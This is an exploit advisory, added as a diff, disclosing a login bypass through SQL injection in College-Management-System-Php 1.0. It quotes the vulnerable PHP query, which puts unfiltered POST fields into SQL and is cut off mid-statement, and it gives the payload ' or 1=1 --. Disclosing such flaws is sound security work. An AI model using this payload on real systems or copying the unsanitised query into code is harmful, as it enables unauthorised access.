@@ -1,0 +1,35 @@
+# Exploit Title: College-Management-System-Php 1.0 - Authentication Bypass / SQL Injection
+# Exploit Author: BLAY ABU SAFIAN (Inveteck Global)
+# Website: https://github.com/olotieno/College-Management-System-Php
+# Date: 2020-06-16
+# Google Dork: N/A
+# Vendor: https://github.com/olotieno/
+# Software Link: https://github.com/olotieno/College-Management-System-Php.git
+# Affected Version: N/A
+# Patched Version: unpatched
+# Category: Web Application
+# Tested on: MAC
+
+The College Management System Php suffers from sql injection vulnerabilities in the index.php page:
+
+$msg="";
+if(isset($_POST['btn_log'])){
+  $uname=$_POST['unametxt'];
+  $pwd=$_POST['pwdtxt'];
+
+  $sql=mysqli_query($con,"SELECT * FROM users_tbl
+              WHERE username='$uname' AND password='$pwd'
+
+SQL injection vulnerability:-
+in file index.php data from POST parameter 'unametxt' and 'pwdtxt' are not getting filter before passing into SQL query and hence rising SQL Injection vulnerability
+
+payload:
+' or 1=1 --
+
+
+
+Thank you
+
+regards
+Abu Safian Blay
+https://inveteckglobal.com<http://inveteckglobal.com>
